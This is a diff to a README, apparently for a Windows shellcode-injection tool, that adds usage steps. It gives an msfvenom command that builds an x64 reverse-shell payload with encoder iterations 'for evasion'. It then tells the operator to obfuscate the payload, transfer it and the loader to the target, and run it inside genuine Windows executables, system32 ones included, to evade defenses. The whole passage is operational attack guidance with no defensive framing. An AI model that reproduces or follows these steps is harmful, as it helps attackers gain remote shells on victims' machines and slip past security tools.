@@ -63,10 +63,17 @@ We suggest to use directly compiled executables as in some situations it depends
 
 # How to use
 
+## :warning: Note - Sometimes you have to Re-run the program because of Memory Issues. But do not worry, You'll get the shell on Re-run !!!  :nazar_amulet:
+
 ***1. Generate a .bin file only - You can use C2 servers and metasploit too or any you want***
 
 Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST<IP> LPORT<PORT> -f raw -i <iterations as you want for evasion> -e <encoder you want to use> > shell.bin - **x64-Bit**
   
  ***2. Obfuscation is mainly your work to do as per your operations. The other one's? - WE'LL HANDLE!!!***
   
+  ***3. Transfer Both Payload and Binary to Target System***
+  ***4. Execute, But remember .bin files can evade better as per my Personal Experience so, just make your Payload Obfuscated for better Defense Evasion.
+  ***5. After Execution, Payload will be run as your specified genuine windows executable ( system32's too )***
+  ***6. If you're injecting to custom binary - It might fails due to Memory allocation issue , still depends on your Privilege and many 3rd
+ level factors. But you can give it a try - In some cases it will work !! :nazar_amulet:***
   
